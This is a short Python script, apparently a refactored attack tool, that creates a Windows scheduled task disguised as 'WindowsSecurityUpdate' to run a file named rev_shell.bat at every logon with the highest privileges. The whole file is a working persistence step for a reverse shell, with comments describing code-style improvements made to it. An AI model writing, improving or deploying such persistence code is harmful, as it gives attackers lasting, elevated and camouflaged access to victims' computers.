from pathlib import Path
import subprocess

# Decided on using pathlib instead of a raw string for better path handling
malicious_script = Path("C:/Users/Public/rev_shell.bat")

task_name = "WindowsSecurityUpdate"
schedule_time = "ONLOGON"

# I also replaced a shell command string with a list of arguments to avoid shell=True issues
command = [
    "schtasks",
    "/Create",
    "/SC", schedule_time,
    "/TN", task_name,
    "/TR", str(malicious_script),
    "/RL", "HIGHEST",
    "/F"
]

# Used capture_output=True and text=True instead of manually handling stdout/stderr
try:
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Scheduled task created successfully.")
    else:
        print(f"[-] Failed to create task:\n{result.stderr.strip()}")
except Exception as e:
    print(f"[-] Exception occurred: {e}")
